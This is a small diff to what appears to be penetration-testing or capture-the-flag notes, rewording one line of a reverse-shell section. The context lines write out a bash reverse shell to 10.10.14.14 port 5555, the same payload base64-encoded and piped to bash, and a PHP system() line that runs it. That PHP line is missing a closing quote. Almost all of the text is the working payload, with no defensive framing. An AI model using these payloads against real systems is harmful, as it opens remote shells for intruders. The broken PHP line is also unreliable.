@@ -21,6 +21,6 @@ echo '/bin/bash -i >& /dev/tcp/10.10.14.14/5555 0>&1' | base64
 Final payload: (Dont forget to URL encode)
 echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0LzU1NTUgMD4mMQo= | base64 -d | bash
 
-If you need to include payload within php code:
+If you need to payload to be executed with PHP:
 <?php system("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0LzU1NTUgMD4mMQo= | base64 -d | bash ?>
 ```
